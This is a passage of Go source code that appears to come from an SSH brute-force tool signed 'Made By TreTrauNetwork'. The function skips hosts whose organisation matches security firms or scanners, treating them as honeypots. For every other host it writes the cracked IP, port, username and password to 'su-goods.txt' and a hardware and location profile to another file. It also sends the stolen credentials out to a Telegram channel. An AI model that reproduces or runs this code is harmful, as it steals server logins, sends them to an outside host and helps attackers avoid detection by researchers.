			"censys", "shadowserver", "greynoise", "bitsight", "binary edge",
			"rapid7", "recyber", "team cymru", "internet census", "honeypot",
			"security research", "palo alto", "crowdstrike", "recorded future",
			"virus total", "abuse.ch", "spamhaus",
		} {
			if strings.Contains(orgLower, hpOrg) {
				info.IsHoneypot = true
				info.HoneypotScore += 5
				break
			}
		}
	}

	if !info.IsHoneypot {
		atomic.AddInt64(&stats.goods, 1)
		line := fmt.Sprintf("%s:%s@%s:%s\n", info.IP, info.Port, info.Username, info.Password)
		appendToFile(line, "su-goods.txt")
		gpuStr := info.GPUInfo
		if gpuStr == "" {
			gpuStr = "N/A"
		}
		diskStr := formatDiskSize(info.MaxDiskGB)
		detailed := fmt.Sprintf(`Made By TreTrauNetwork
=== SSH ===
Target: %s:%s
Credentials: %s:%s
Hostname: %s
OS: %s
SSH Version: %s
Response Time: %v
Open Ports: %v
CPU Cores: %d
Architecture: %s
CPU Model: %s
GPU: %s
Max Disk: %s
Country: %s
Region: %s
City: %s
Org: %s
Honeypot Score: %d
Timestamp: %s
===========

`, info.IP, info.Port, info.Username, info.Password, info.Hostname, info.OSInfo, info.SSHVersion,
			info.ResponseTime, strings.Join(info.OpenPorts, ", "), info.CPUCores, info.Architecture, info.CPUModel,
			gpuStr, diskStr,
			ipinfo.Country, ipinfo.Region, ipinfo.City, ipinfo.Org, info.HoneypotScore, time.Now().Format("2006-01-02 15:04:05"))
		appendToFile(detailed, "detailed-results.txt")
		
		telegramMsg := fmt.Sprintf(`✅ <b>SSH SUCCESS</b>
🌐 %s:%s
🔑 %s:%s
🖥️ Hostname: %s
💻 OS: %s
📍 %s, %s, %s
🏢 %s
⏱️ Response: %v`,
			info.IP, info.Port, info.Username, info.Password,
			info.Hostname, info.OSInfo,
			ipinfo.City, ipinfo.Region, ipinfo.Country,
			ipinfo.Org, info.ResponseTime)
		
		go sendTelegramMessage(telegramMsg)
		
		fmt.Printf("SUCCESS: %s\n", line[:len(line)-1])
	} else {
		atomic.AddInt64(&stats.honeypots, 1)
		log.Printf("Honeypot: %s:%s (Score: %d)", info.IP, info.Port, info.HoneypotScore)

		if info.HoneypotScore >= 10 {
			appendToFile(fmt.Sprintf("HONEYPOT_HIGHSCORE: %s:%s@%s:%s (Score: %d) CPU: %d\n",
				info.IP, info.Port, info.Username, info.Password, info.HoneypotScore, info.CPUCores), "honeypots.txt")
		} else {
			appendToFile(fmt.Sprintf("HONEYPOT: %s:%s@%s:%s (Score: %d) CPU: %d\n", info.IP, info.Port, info.Username, info.Password, info.HoneypotScore, info.CPUCores), "honeypots.txt")
		}
	}
}
